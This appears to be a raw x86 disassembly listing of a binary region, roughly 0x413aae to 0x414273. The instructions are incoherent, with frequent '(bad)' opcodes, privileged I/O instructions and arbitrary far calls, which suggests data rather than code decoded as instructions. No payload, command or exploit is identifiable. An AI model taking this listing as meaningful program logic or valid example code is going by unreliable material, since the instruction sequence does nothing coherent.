  413aae:	fidiv  DWORD PTR [eax-0x33a66d80]
  413ab4:	lods   al,BYTE PTR ds:[esi]
  413ab5:	call   0x176d:0x81889b6c
  413abc:	and    al,0x18
  413abe:	pop    ds
  413abf:	fs es ret 0x3022
  413ac4:	pop    ecx
  413ac5:	ins    DWORD PTR es:[edi],dx
  413ac6:	push   ecx
  413ac7:	inc    ebp
  413ac8:	popf   
  413ac9:	jo     0x413ac9
  413acb:	shr    DWORD PTR es:[eax-0x3fdab00c],cl
  413ad2:	ins    DWORD PTR es:[edi],dx
  413ad3:	sbb    al,0x6c
  413ad5:	(bad)  
  413ad6:	mov    dh,0x40
  413ad8:	inc    edi
  413ad9:	xlat   BYTE PTR ds:[ebx]
  413ada:	dec    ecx
  413adb:	push   cs
  413adc:	push   edx
  413add:	outs   dx,BYTE PTR ds:[esi]
  413ade:	xlat   BYTE PTR ds:[ebx]
  413adf:	xor    cl,dl
  413ae1:	push   0xfc889144
  413ae6:	or     al,al
  413ae8:	lods   al,BYTE PTR ds:[esi]
  413ae9:	lock mov dh,0x19
  413aec:	adc    DWORD PTR ds:[edx],ebx
  413aef:	(bad)  
  413af0:	lods   al,BYTE PTR ds:[esi]
  413af1:	es sbb cl,0xd6
  413af5:	out    dx,al
  413af6:	sbb    eax,0x51ac7a50
  413afb:	nop
  413afc:	sbb    dl,BYTE PTR [eax]
  413afe:	cmp    BYTE PTR [eax+ecx*2+0x655a2ad],ch
  413b05:	(bad)  
  413b06:	or     al,0x67
  413b08:	shl    cl,1
  413b0a:	cmp    ah,BYTE PTR [ecx+0x4b]
  413b0d:	outs   dx,DWORD PTR ds:[esi]
  413b0e:	lods   eax,DWORD PTR ds:[esi]
  413b0f:	push   eax
  413b10:	mov    esi,0x2a3493be
  413b15:	pop    ds
  413b16:	push   es
  413b17:	push   ss
  413b18:	adc    al,0xc6
  413b1a:	stc    
  413b1b:	dec    eax
  413b1c:	mov    edx,DWORD PTR [ebp-0x34]
  413b1f:	jmp    0x413b1b
  413b21:	dec    esp
  413b22:	ins    BYTE PTR es:[edi],dx
  413b23:	or     eax,0x573a7226
  413b28:	inc    eax
  413b29:	into   
  413b2a:	call   DWORD PTR [edi]
  413b2c:	push   ecx
  413b2d:	sub    ah,dl
  413b2f:	fnstcw WORD PTR [edx+0x668a5ae9]
  413b35:	push   eax
  413b36:	xchg   edi,eax
  413b37:	and    al,0x62
  413b39:	aad    0xa4
  413b3b:	sbb    al,0x84
  413b3d:	shl    BYTE PTR [esi-0x5b7fecf6],1
  413b43:	(bad)  
  413b44:	(bad)  
  413b45:	das    
  413b46:	jbe    0x413b19
  413b48:	sub    dl,BYTE PTR [esi-0x4c]
  413b4b:	xchg   esi,eax
  413b4c:	adc    BYTE PTR [ecx-0x36],cl
  413b4f:	mov    edx,0x46793a7e
  413b54:	inc    esp
  413b55:	xchg   BYTE PTR [esi+0x7a00d326],dh
  413b5b:	mov    dl,0xec
  413b5d:	xor    al,0xcc
  413b5f:	enter  0xad00,0x91
  413b63:	cmp    BYTE PTR [eax],dl
  413b65:	jecxz  0x413bc7
  413b67:	jno    0x413b7f
  413b69:	test   BYTE PTR [ebp-0x15f02f29],0x7b
  413b70:	jns    0x413b2e
  413b72:	lea    ebx,[esi-0x75ef533]
  413b78:	mov    esi,0x20167356
  413b7d:	push   ss
  413b7e:	mov    al,ds:0x8e0a8122
  413b83:	lods   eax,DWORD PTR ds:[esi]
  413b84:	adc    eax,0xaccbd470
  413b89:	xor    ch,BYTE PTR [ebx+eax*2+0x2b]
  413b8d:	sub    bh,BYTE PTR [edx]
  413b8f:	or     bl,BYTE PTR [ebx+ecx*8-0xc65abfa]
  413b96:	lods   al,BYTE PTR ds:[esi]
  413b97:	gs inc edx
  413b99:	ss adc al,0x5d
  413b9c:	inc    ecx
  413b9d:	push   ss
  413b9e:	jb     0x413c02
  413ba0:	mov    esp,ss
  413ba2:	nop
  413ba3:	fwait
  413ba4:	sbb    eax,0xb2cab056
  413ba9:	(bad)  
  413baa:	jbe    0x413bde
  413bac:	push   ds
  413bad:	popa   
  413bae:	jbe    0x413b9a
  413bb0:	aas    
  413bb1:	clc    
  413bb2:	or     al,0x2d
  413bb4:	push   0x34
  413bb6:	call   0x544b0cd5
  413bbb:	pop    eax
  413bbc:	dec    edx
  413bbd:	lods   eax,DWORD PTR ds:[esi]
  413bbe:	test   al,0x5d
  413bc0:	push   ebx
  413bc1:	adc    dh,ch
  413bc3:	mov    eax,0xcad3e04c
  413bc8:	ins    DWORD PTR es:[edi],dx
  413bc9:	popa   
  413bca:	push   ebx
  413bcb:	xchg   ebx,eax
  413bcc:	inc    ecx
  413bcd:	es mov eax,0xfc3658eb
  413bd3:	mov    ah,0x14
  413bd5:	inc    edx
  413bd6:	xchg   edi,eax
  413bd7:	push   0x2662a214
  413bdc:	adc    dl,al
  413bde:	push   esp
  413bdf:	mov    dh,0xb8
  413be1:	imul   DWORD PTR [esp+esi*8-0x2565979c]
  413be8:	test   eax,0x3af6d62b
  413bed:	popf   
  413bee:	sti    
  413bef:	push   cs
  413bf0:	inc    eax
  413bf1:	fcmovnbe st,st(0)
  413bf3:	rol    DWORD PTR [eax+ebx*1],1
  413bf6:	dec    eax
  413bf7:	jnp    0x413be5
  413bf9:	pop    ss
  413bfa:	pop    ebx
  413bfb:	xchg   esp,eax
  413bfc:	or     BYTE PTR [eax+ebp*8-0x6c],ch
  413c00:	pop    esi
  413c01:	jl     0x413c5b
  413c03:	es mov dh,0x41
  413c06:	mov    esi,0x1c03012f
  413c0c:	call   0x5f1d:0xaa8755cf
  413c13:	pop    eax
  413c14:	push   esi
  413c15:	jb     0x413bb8
  413c17:	clc    
  413c18:	int3   
  413c19:	mov    DWORD PTR [edi],ecx
  413c1b:	pusha  
  413c1c:	sub    DWORD PTR [eax+0x53],0xbf511072
  413c23:	add    ch,BYTE PTR [ecx+ebx*2-0x77]
  413c27:	inc    ecx
  413c28:	mov    al,ds:0xdc24bcca
  413c2d:	add    BYTE PTR [ebp+0x75],dh
  413c30:	jb     0x413c32
  413c32:	mov    al,ds:0x3e5440a8
  413c37:	out    0xd4,eax
  413c39:	sub    bl,BYTE PTR [edx+0x3e]
  413c3c:	fadd   QWORD PTR [ecx*1+0x52fcc552]
  413c43:	enter  0x5d1a,0x7e
  413c47:	arpl   WORD PTR [edx],cx
  413c49:	sbb    ebx,DWORD PTR [edx]
  413c4b:	cmp    BYTE PTR [esi],dl
  413c4d:	stos   BYTE PTR es:[edi],al
  413c4e:	bswap  ebp
  413c50:	neg    BYTE PTR [edx]
  413c52:	shl    DWORD PTR ss:[esi+0x5a31701a],1
  413c59:	and    al,ch
  413c5b:	push   ss
  413c5c:	cmp    eax,edx
  413c5e:	jle    0x413cb0
  413c60:	sbb    ch,BYTE PTR [edx]
  413c62:	retf   0x1a0a
  413c65:	jl     0x413bea
  413c67:	xchg   edx,eax
  413c68:	lods   eax,DWORD PTR ds:[esi]
  413c69:	push   0x83ad4a4
  413c6e:	ja     0x413c5e
  413c70:	cs jnp 0x413cd3
  413c73:	mov    eax,ds:0x82fe0e62
  413c78:	inc    ebp
  413c79:	mov    eax,0xd6c70abc
  413c7e:	lock inc esi
  413c80:	cmp    al,BYTE PTR [eax]
  413c82:	xor    eax,DWORD PTR [edi+eax*2-0x3c]
  413c86:	sub    BYTE PTR [eax],bl
  413c88:	sub    BYTE PTR ss:[esi],cl
  413c8b:	call   0x245afd68
  413c90:	ss in  al,dx
  413c92:	add    al,0x60
  413c94:	imul   ebx,DWORD PTR ds:0x61e0655,0xffffff8d
  413c9b:	adc    BYTE PTR [esp+ebx*1],dl
  413c9e:	fwait
  413c9f:	inc    edx
  413ca0:	in     eax,0x2a
  413ca2:	cli    
  413ca3:	or     DWORD PTR [ecx+eiz*1],esi
  413ca6:	outs   dx,BYTE PTR ds:[esi]
  413ca7:	pusha  
  413ca8:	jmp    0x413c84
  413caa:	aas    
  413cab:	push   es
  413cac:	mov    al,0xe1
  413cae:	out    0x98,al
  413cb0:	adc    edi,DWORD PTR [ebp+0x18]
  413cb3:	pop    edi
  413cb4:	add    BYTE PTR gs:[edx-0x48eaff4b],bl
  413cbb:	cmp    dl,ah
  413cbd:	sbb    DWORD PTR [eax],eax
  413cbf:	mov    dh,0x7c
  413cc1:	jns    0x413ccd
  413cc3:	and    BYTE PTR [ebp+esi*4+0x2497e167],ah
  413cca:	inc    eax
  413ccb:	fnstsw WORD PTR [eax+0x22]
  413cce:	mov    dl,0x7f
  413cd0:	lock push cs
  413cd2:	adc    BYTE PTR [ebp-0x70f58766],ch
  413cd8:	and    bh,dh
  413cda:	add    bl,al
  413cdc:	cmp    DWORD PTR [edi-0x49],edx
  413cdf:	je     0x413c87
  413ce1:	push   0xa2565418
  413ce6:	ror    DWORD PTR [ebx],1
  413ce8:	pusha  
  413ce9:	xor    eax,0xdb5112b8
  413cee:	vmwrite eax,DWORD PTR [ecx+0x6d]
  413cf2:	adc    eax,0x729188b6
  413cf7:	inc    esi
  413cf8:	jbe    0x413ccb
  413cfa:	call   0x75a1:0x3402b2e3
  413d01:	dec    esi
  413d02:	call   0x1c8c1951
  413d07:	xchg   BYTE PTR [edx],cl
  413d09:	xlat   BYTE PTR ds:[ebx]
  413d0a:	and    BYTE PTR [edi-0x735fd1ee],0x4c
  413d11:	cmp    eax,0x3c078292
  413d16:	ret    0x295a
  413d19:	shl    ch,cl
  413d1b:	or     al,0x3c
  413d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d1e:	not    BYTE PTR [esi]
  413d20:	xor    al,0xc1
  413d22:	mov    ?,WORD PTR [ebp+0x6]
  413d25:	lds    esp,FWORD PTR [edx+0x54]
  413d28:	pop    eax
  413d29:	test   DWORD PTR [esi],ebx
  413d2b:	sub    eax,0xfa2b68b6
  413d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d31:	cmp    BYTE PTR [edi+0x5f94e76e],bl
  413d37:	scas   eax,DWORD PTR es:[edi]
  413d38:	push   esi
  413d39:	add    BYTE PTR ds:0x48b24a9a,al
  413d3f:	ficom  DWORD PTR [edx-0x25]
  413d42:	inc    eax
  413d43:	mov    eax,ds:0x11b555a1
  413d48:	and    bl,BYTE PTR [edx]
  413d4a:	test   BYTE PTR [ebp-0x6f910cf6],0x56
  413d51:	or     BYTE PTR [eax-0x4f],al
  413d54:	sahf   
  413d55:	xchg   ecx,ebx
  413d57:	les    edi,FWORD PTR [eax+ebx*1-0x24]
  413d5b:	stos   BYTE PTR es:[edi],al
  413d5c:	add    DWORD PTR [esp+ecx*4+0x18dc28c8],ecx
  413d63:	mov    al,0xe6
  413d65:	sub    ebx,DWORD PTR [edx]
  413d67:	dec    edx
  413d68:	adc    dl,bh
  413d6a:	(bad)  
  413d6c:	add    dh,dl
  413d6e:	fnstsw WORD PTR [ebx]
  413d70:	inc    eax
  413d71:	inc    ecx
  413d72:	sub    eax,0x50d005b0
  413d77:	or     edi,DWORD PTR [esp+eiz*8+0x4b]
  413d7b:	nop
  413d7c:	mov    bh,0x1
  413d7e:	fcomi  st,st(0)
  413d80:	add    dl,BYTE PTR [edx]
  413d82:	push   eax
  413d83:	int    0xd4
  413d85:	mov    dl,0x66
  413d87:	and    eax,0x7c293701
  413d8c:	xchg   esi,eax
  413d8d:	mov    dh,0xa
  413d8f:	aad    0x6
  413d91:	mov    dh,0xa4
  413d93:	push   0xffffffea
  413d95:	pop    esi
  413d96:	inc    edi
  413d97:	sbb    al,0x35
  413d99:	mov    ecx,0x21db4c3b
  413d9e:	sub    al,0x5
  413da0:	dec    esp
  413da1:	enter  0x7ca7,0x96
  413da5:	mov    al,ds:0x828569b3
  413daa:	xor    dh,dh
  413dac:	sbb    al,0x7b
  413dae:	sbb    eax,0x67b60417
  413db3:	ficomp DWORD PTR [edi]
  413db5:	les    edx,FWORD PTR [esi+0x9e186db]
  413dbb:	mov    al,0x66
  413dbd:	add    BYTE PTR [esi],cl
  413dbf:	cmp    DWORD PTR [ecx+eax*8-0x3beab60a],ebp
  413dc6:	int3   
  413dc7:	dec    eax
  413dc8:	jmp    0x18f71b07
  413dcd:	xchg   BYTE PTR [esi+0x5e94005a],ah
  413dd3:	aad    0x54
  413dd5:	jbe    0x413da4
  413dd7:	pop    esp
  413dd8:	outs   dx,DWORD PTR ds:[esi]
  413dd9:	cmp    eax,0x52b4b604
  413dde:	inc    edx
  413ddf:	xchg   edx,eax
  413de0:	fisubr WORD PTR [edx-0x44]
  413de3:	ins    BYTE PTR es:[edi],dx
  413de4:	lods   al,BYTE PTR ds:[esi]
  413de5:	push   ebp
  413de6:	push   edi
  413de7:	shl    BYTE PTR [ecx],cl
  413de9:	fld    TBYTE PTR [esi+0x554f5aff]
  413def:	xor    eax,0xc82ed05b
  413df4:	push   ebp
  413df5:	push   0x6
  413df7:	nop
  413df8:	out    dx,eax
  413df9:	sbb    DWORD PTR [edx],esp
  413dfb:	retf   0x7819
  413dfe:	adc    al,0x76
  413e01:	(bad)  
  413e02:	cmc    
  413e03:	mov    edi,0xcb0af4c4
  413e08:	push   0x15
  413e0a:	dec    ebp
  413e0b:	sub    ebx,DWORD PTR [eax]
  413e0d:	pop    edi
  413e0e:	call   0x4716:0xb5c45bb1
  413e15:	pop    edx
  413e16:	inc    edi
  413e17:	xchg   DWORD PTR [eax+0x30433606],edx
  413e1d:	lods   eax,DWORD PTR ds:[esi]
  413e1e:	inc    esi
  413e1f:	dec    edi
  413e20:	push   ebp
  413e21:	xchg   edi,eax
  413e22:	push   0x309ae236
  413e27:	int    0x96
  413e29:	repnz push ecx
  413e2b:	jae    0x413e77
  413e2d:	dec    ebp
  413e2e:	pop    eax
  413e2f:	sbb    al,0xd0
  413e31:	jbe    0x413e6b
  413e33:	mov    al,0x3
  413e35:	or     eax,0xd7ae6b80
  413e3a:	or     bl,BYTE PTR ds:[ebx+0x6c]
  413e3e:	shl    BYTE PTR [eax],1
  413e40:	jl     0x413e74
  413e42:	lahf   
  413e43:	and    al,0x28
  413e45:	mov    ds:0x82c2c9f8,eax
  413e4a:	pop    edx
  413e4b:	jb     0x413dd1
  413e4d:	sbb    BYTE PTR [edx+0x6f],0x62
  413e51:	xchg   esi,esi
  413e53:	ss mov eax,0x1deb3c0c
  413e59:	mov    dh,0xa8
  413e5b:	mov    al,ds:0xa5bbd43e
  413e60:	hlt    
  413e61:	mov    edx,0x8300991d
  413e66:	pop    ss
  413e67:	aam    0xe
  413e69:	mov    ah,0x3e
  413e6b:	xor    edi,DWORD PTR [ecx-0x7fd15a76]
  413e71:	rol    BYTE PTR [edx-0x21d3a396],0x31
  413e78:	add    al,ah
  413e7a:	es sbb al,0x54
  413e7d:	pop    eax
  413e7e:	sbb    eax,0xb49e0b0e
  413e83:	and    BYTE PTR [edx+0x1c15702d],al
  413e89:	xor    ecx,DWORD PTR [eax+esi*1+0xbca527f]
  413e90:	ds push eax
  413e92:	test   al,0xc4
  413e94:	xchg   ebp,eax
  413e95:	add    ch,bl
  413e97:	jp     0x413ed5
  413e99:	mov    cl,0x0
  413e9b:	add    BYTE PTR [ebx+0x67efcc2a],cl
  413ea1:	loop   0x413e86
  413ea3:	xchg   BYTE PTR ds:0x593c5511,dh
  413ea9:	fwait
  413eaa:	les    esp,FWORD PTR [esi-0x27d9a990]
  413eb0:	inc    eax
  413eb1:	cs mov esp,0x703445c9
  413eb7:	ins    BYTE PTR es:[edi],dx
  413eb8:	or     ah,al
  413eba:	xchg   ebp,eax
  413ebb:	add    BYTE PTR fs:[edx-0x2e2f2e26],bl
  413ec2:	xor    al,0xfc
  413ec4:	sub    DWORD PTR [eax],ecx
  413ec6:	out    dx,al
  413ec7:	(bad)  
  413ec8:	fisttp WORD PTR [eax]
  413eca:	aam    0xb5
  413ecc:	call   0x145d2121
  413ed1:	imul   eax,DWORD PTR [edx+esi*1+0x13e3a6d2],0x54
  413ed9:	push   eax
  413eda:	push   ds
  413edb:	outs   dx,BYTE PTR ds:[esi]
  413edc:	dec    ebx
  413edd:	dec    edi
  413ede:	nop
  413edf:	or     DWORD PTR [edx+0x24],edi
  413ee2:	xor    eax,0xe7e0449
  413ee7:	stc    
  413ee8:	(bad)  
  413ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eea:	(bad)  
  413eeb:	rcl    BYTE PTR [eax+0x47aa1a7e],0x41
  413ef2:	stos   BYTE PTR es:[edi],al
  413ef3:	sub    ch,BYTE PTR [edi+eax*2+0x16]
  413ef7:	xchg   esi,eax
  413ef8:	jge    0x413eef
  413efa:	cmp    al,BYTE PTR [esi-0x79]
  413efd:	scas   al,BYTE PTR es:[edi]
  413efe:	nop
  413eff:	push   eax
  413f00:	pusha  
  413f01:	cmp    ebp,DWORD PTR [edx-0x2175c0d6]
  413f07:	sbb    al,0x3a
  413f09:	xor    cx,bp
  413f0c:	ret    0x56c2
  413f0f:	pop    edx
  413f10:	push   0x1c
  413f12:	cdq    
  413f13:	push   esi
  413f14:	nop
  413f15:	cmp    ebp,DWORD PTR [edx-0x25b5b4ae]
  413f1b:	mov    al,ds:0xad685a54
  413f20:	imul   ebp,DWORD PTR [eax-0x593d106a],0xf4531ca4
  413f2a:	loope  0x413eff
  413f2c:	adc    bl,BYTE PTR [eax+0x68]
  413f2f:	jp     0x413f05
  413f31:	push   esi
  413f32:	pop    eax
  413f33:	aam    0x5c
  413f35:	add    BYTE PTR [esi-0x49a6ddee],0xdd
  413f3c:	adc    eax,0xf4dfad9e
  413f42:	mul    ecx
  413f44:	ss (bad) 
  413f46:	fdiv   QWORD PTR [ecx+0x58135e0a]
  413f4c:	jb     0x413ef5
  413f4e:	adc    eax,0x66f78220
  413f53:	(bad)  
  413f54:	sub    al,0x68
  413f56:	mov    eax,0x86a4cca6
  413f5b:	and    edi,DWORD PTR [esi+0x4e]
  413f5e:	cmp    al,0x60
  413f60:	(bad)  
  413f61:	mov    cl,0xd5
  413f63:	imul   ebp,DWORD PTR [eax],0x26
  413f66:	push   esp
  413f67:	dec    ecx
  413f68:	out    dx,eax
  413f69:	sub    dl,BYTE PTR [eax+0x19]
  413f6c:	mov    eax,0x6e008dfc
  413f71:	mov    bh,BYTE PTR [esi+0x4d]
  413f74:	stos   BYTE PTR es:[edi],al
  413f75:	xor    ch,BYTE PTR [edx+ebp*8]
  413f78:	push   cs
  413f79:	sti    
  413f7a:	and    BYTE PTR [edx],al
  413f7c:	mov    ds:0x85724608,al
  413f81:	call   0x2823:0x876e2c52
  413f88:	or     al,0xca
  413f8a:	jo     0x413fac
  413f8c:	bound  eax,QWORD PTR [ebx-0x48]
  413f8f:	bound  edi,QWORD PTR [ecx]
  413f91:	(bad)  
  413f92:	or     al,0x85
  413f94:	push   ebx
  413f95:	pop    ebx
  413f96:	push   eax
  413f97:	push   ebp
  413f98:	ss inc edx
  413f9a:	jmp    0x8b8e:0x5560bac3
  413fa1:	fs ffreep st(6)
  413fa4:	push   es
  413fa5:	push   ebp
  413fa6:	xchg   esp,esp
  413fa8:	bound  ecx,QWORD PTR [eax+0x6c]
  413fab:	aam    0xee
  413fad:	fadd   DWORD PTR [esp+ecx*1-0x77]
  413fb1:	dec    eax
  413fb2:	retf   0xa964
  413fb5:	pop    edi
  413fb6:	stos   BYTE PTR es:[edi],al
  413fb7:	mov    ds:0x54268be1,al
  413fbc:	and    ah,cl
  413fbe:	and    dh,BYTE PTR [eax+0x10]
  413fc1:	ins    BYTE PTR es:[edi],dx
  413fc2:	pop    ebp
  413fc3:	lods   eax,DWORD PTR ds:[esi]
  413fc4:	data16 mov al,0x1c
  413fc7:	leave  
  413fc8:	dec    edx
  413fc9:	or     edx,DWORD PTR [edx-0x3c]
  413fcc:	sbb    eax,0x52
  413fcf:	inc    edi
  413fd0:	add    DWORD PTR [ecx-0x10],0x3e
  413fd4:	sub    al,0x2a
  413fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd7:	mov    eax,ds:0x2a056450
  413fdc:	xchg   ebx,eax
  413fdd:	sar    BYTE PTR [esi],1
  413fdf:	mov    bh,BYTE PTR [eax]
  413fe1:	or     eax,0x94508fa2
  413fe6:	xor    al,0xb5
  413fe8:	sbb    bl,BYTE PTR [esi-0x38b8d786]
  413fee:	or     DWORD PTR [eax+0x1251966b],0xdac1aef0
  413ff8:	call   0x6328:0x859ca68
  413fff:	mov    ?,WORD PTR [esi-0x6987d22e]
  414005:	lock ss popf 
  414008:	call   0xdf474a73
  41400d:	xchg   ebp,eax
  41400e:	inc    ecx
  41400f:	xchg   ebx,eax
  414010:	add    BYTE PTR [edx+0x43ee061c],0xa8
  414017:	sbb    al,0x8b
  414019:	ficomp WORD PTR [edx-0x22]
  41401c:	jl     0x41400b
  41401e:	mov    esi,0x7a000d20
  414023:	inc    esp
  414024:	jae    0x413fe7
  414026:	pusha  
  414027:	loopne 0x41407c
  414029:	ins    DWORD PTR es:[edi],dx
  41402a:	add    DWORD PTR [eax+ebp*2],esi
  41402d:	int3   
  41402e:	pop    esi
  41402f:	pop    ss
  414030:	cs imul eax,ebx,0x60a949d1
  414037:	sti    
  414038:	(bad)  
  414039:	shl    DWORD PTR [edx-0x4fb4b5ab],cl
  41403f:	inc    edx
  414040:	cdq    
  414041:	dec    esi
  414042:	pop    edx
  414043:	ins    BYTE PTR es:[edi],dx
  414044:	jb     0x41407f
  414046:	mov    edx,0x34f481ad
  41404b:	add    BYTE PTR [esi+ebx*8+0xaa2be2a],cl
  414052:	or     ah,BYTE PTR [eax+0x2b]
  414055:	xor    al,0xdb
  414057:	fadd   DWORD PTR [eax+ebp*1]
  41405a:	jmp    0xa16:0xdcba840c
  414061:	lock ret 0xfe44
  414065:	or     DWORD PTR [eax+0x141a9da2],esi
  41406b:	fnstsw WORD PTR [edx+eiz*1+0x3f]
  41406f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414070:	add    ah,ah
  414072:	pusha  
  414073:	dec    eax
  414074:	cmp    al,0x90
  414076:	dec    esp
  414077:	mov    edi,0xc002107f
  41407c:	add    dh,BYTE PTR [edx+ebx*2]
  41407f:	dec    ebx
  414080:	inc    esi
  414081:	mov    edx,0xcdb52d64
  414086:	lock or ch,BYTE PTR [esi+0x58]
  41408a:	push   cs
  41408b:	mov    dl,0x54
  41408d:	(bad)  
  41408e:	cmp    bh,ch
  414090:	push   eax
  414091:	fs es lock js 0x41409f
  414096:	ror    BYTE PTR [edx-0x57],0xda
  41409a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41409b:	add    BYTE PTR [eax+0x18],dl
  41409e:	mov    ds:0x1f9e8e16,eax
  4140a3:	inc    esi
  4140a4:	lds    ecx,FWORD PTR [edx-0x1dd5ebe9]
  4140aa:	push   eax
  4140ab:	dec    esp
  4140ac:	xchg   esi,eax
  4140ad:	retf   0x47a6
  4140b0:	(bad)  
  4140b1:	das    
  4140b2:	ins    DWORD PTR es:[edi],dx
  4140b3:	sub    dh,dl
  4140b5:	mov    al,0xaa
  4140b7:	inc    ebx
  4140b8:	mov    ds:0x6b55c93c,eax
  4140bd:	or     eax,0x29c0e0d
  4140c2:	stc    
  4140c3:	call   0x24f:0xa2edb89f
  4140ca:	lea    eax,[esp+edi*8+0x6]
  4140ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140cf:	out    0x2,al
  4140d1:	inc    ecx
  4140d2:	(bad)  
  4140d3:	mov    gs,WORD PTR [ebx]
  4140d5:	cmp    ax,0x602e
  4140d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140da:	push   es
  4140db:	mov    dh,BYTE PTR [ebp+0x26b6d1cb]
  4140e1:	lods   al,BYTE PTR ds:[esi]
  4140e2:	fld    TBYTE PTR [ebp-0x7f39f90]
  4140e8:	repnz mov ebx,0xd44b2eb3
  4140ee:	mov    dh,0x9f
  4140f0:	je     0x414170
  4140f2:	mov    esp,0xdb00eeb2
  4140f7:	pop    edx
  4140f8:	push   ebp
  4140f9:	dec    esp
  4140fa:	dec    esi
  4140fb:	sub    eax,0x249ad410
  414100:	or     al,0x16
  414102:	cwde   
  414103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414104:	push   es
  414105:	xchg   DWORD PTR [edx+eiz*2+0x2d84fe58],ecx
  41410c:	push   ss
  41410d:	xor    al,0xfe
  41410f:	mov    DWORD PTR [edx+0x376b4783],edi
  414115:	mov    dh,0x60
  414117:	inc    edi
  414118:	aad    0x95
  41411a:	push   ss
  41411b:	add    al,0x96
  41411d:	cmp    DWORD PTR [esi+0x7d],esp
  414120:	inc    esi
  414121:	sub    dh,BYTE PTR [esi-0x79ab5cfd]
  414127:	xor    ch,BYTE PTR [ebx]
  414129:	adc    BYTE PTR [ebx],cl
  41412b:	rcr    BYTE PTR [edx+ebx*2],0xa2
  41412f:	mov    ch,0xad
  414131:	retf   0x1258
  414134:	enter  0x402e,0x4f
  414138:	call   0x661:0x51f14005
  41413f:	lods   al,BYTE PTR ds:[esi]
  414140:	adc    dh,ah
  414142:	cmp    BYTE PTR cs:[esi+0x1900d6b5],0x55
  41414a:	push   ss
  41414b:	xchg   esp,eax
  41414c:	cld    
  41414d:	pushf  
  41414e:	jle    0x41410e
  414150:	lods   eax,DWORD PTR ds:[esi]
  414151:	sub    ch,BYTE PTR [eax-0x72]
  414154:	mov    dh,BYTE PTR [esp+edx*4-0x33b6b1a2]
  41415b:	jns    0x414183
  41415d:	inc    edx
  41415e:	inc    edi
  41415f:	inc    ebx
  414160:	xchg   DWORD PTR [edx+edi*4+0x9],esp
  414164:	add    al,BYTE PTR [edx]
  414166:	test   BYTE PTR ss:[ebx+ebx*2],0x81
  41416b:	shl    DWORD PTR [eax-0x52],0xb9
  41416f:	out    dx,al
  414170:	xchg   ebp,eax
  414171:	xchg   ecx,eax
  414172:	sbb    dh,BYTE PTR [esi+eax*4+0x4858d6a6]
  414179:	push   0xffffff9e
  41417b:	push   0xfffffff5
  41417d:	dec    edx
  41417e:	mov    edx,0x1586ad58
  414183:	push   esi
  414184:	add    al,ah
  414186:	sbb    ah,0xf4
  414189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41418a:	mov    gs,WORD PTR [edx+0x5d6b3082]
  414190:	xchg   BYTE PTR [esi+0x5004ae16],dl
  414196:	test   BYTE PTR [esi+0x9],dl
  414199:	cmp    eax,0xd5c6410a
  41419e:	pop    esi
  41419f:	or     ebx,DWORD PTR [ecx+0x6ab1c142]
  4141a5:	pop    ds
  4141a6:	scas   al,BYTE PTR es:[edi]
  4141a7:	(bad)  
  4141a8:	ror    DWORD PTR [edx],1
  4141aa:	inc    esp
  4141ab:	fwait
  4141ac:	outs   dx,BYTE PTR ds:[esi]
  4141ad:	(bad)  
  4141ae:	test   bh,ah
  4141b0:	es data16 daa 
  4141b3:	call   0x8e58:0x26b6d1e6
  4141ba:	ja     0x4141dc
  4141bc:	push   ds
  4141bd:	sub    BYTE PTR ds:0x1c94724c,al
  4141c3:	je     0x41420e
  4141c5:	lods   al,BYTE PTR ds:[esi]
  4141c6:	clc    
  4141c7:	push   es
  4141c8:	loop   0x414183
  4141ca:	mov    BYTE PTR [ecx+0x7068ecb],cl
  4141d0:	cmc    
  4141d1:	sub    ch,0x92
  4141d4:	inc    esp
  4141d5:	out    0x8a,eax
  4141d7:	add    eax,0x8d86c45f
  4141dc:	add    BYTE PTR [ebx-0x3c],0x92
  4141e0:	xchg   edx,eax
  4141e1:	mov    edx,0xb226f2f
  4141e6:	xchg   BYTE PTR [edx+0x3e],al
  4141e9:	mov    dl,0x4c
  4141eb:	jg     0x414265
  4141ed:	add    BYTE PTR [edi],al
  4141ef:	sub    eax,0x440d5250
  4141f4:	sub    al,0x58
  4141f6:	xor    BYTE PTR [edx-0x5f7fd20e],dh
  4141fc:	push   ebp
  4141fd:	mov    ds:0xae2b8296,al
  414202:	jo     0x4141d6
  414204:	cdq    
  414205:	adc    BYTE PTR [edi+ecx*2-0x58],al
  414209:	push   ss
  41420a:	cdq    
  41420b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41420c:	jle    0x414223
  41420e:	add    cl,BYTE PTR [edx]
  414210:	js     0xee69d8d8
  414216:	push   0x1f
  414218:	mov    DWORD PTR [edx-0x5dd30177],esp
  41421e:	jne    0x4141d1
  414220:	cs ret 
  414222:	jo     0x414217
  414224:	in     eax,dx
  414225:	pop    eax
  414226:	fcom   st(5)
  414228:	out    dx,al
  414229:	cmc    
  41422a:	fld    DWORD PTR [eax]
  41422c:	js     0x414243
  41422e:	in     al,dx
  41422f:	add    BYTE PTR [ecx],al
  414231:	push   eax
  414232:	daa    
  414233:	add    bl,bl
  414235:	inc    esp
  414236:	imul   ecx,DWORD PTR [esi+0x16],0x43352bc4
  41423d:	mov    al,0x87
  41423f:	xchg   BYTE PTR [edi-0x5e],ah
  414242:	out    dx,al
  414243:	pop    esi
  414244:	sbb    edi,DWORD PTR [edx-0x679b0fab]
  41424a:	jae    0x414264
  41424c:	xchg   ebx,eax
  41424d:	(bad)  
  41424e:	sti    
  41424f:	push   0x17
  414251:	stos   DWORD PTR es:[edi],eax
  414252:	mov    ecx,0x2a4adcc2
  414257:	stos   BYTE PTR es:[edi],al
  414258:	add    ah,dh
  41425a:	hlt    
  41425b:	in     al,dx
  41425c:	fwait
  41425d:	adc    esi,DWORD PTR [edx+0x2c]
  414260:	adc    al,0xa4
  414262:	(bad)  
  414263:	jmp    0x3915:0xf33efab6
  41426a:	mov    BYTE PTR [esi-0x4e],ah
  41426d:	cmp    al,BYTE PTR [ebx+0x60]
  414270:	dec    edx
  414271:	sbb    al,0x4
  414273:	push   esi
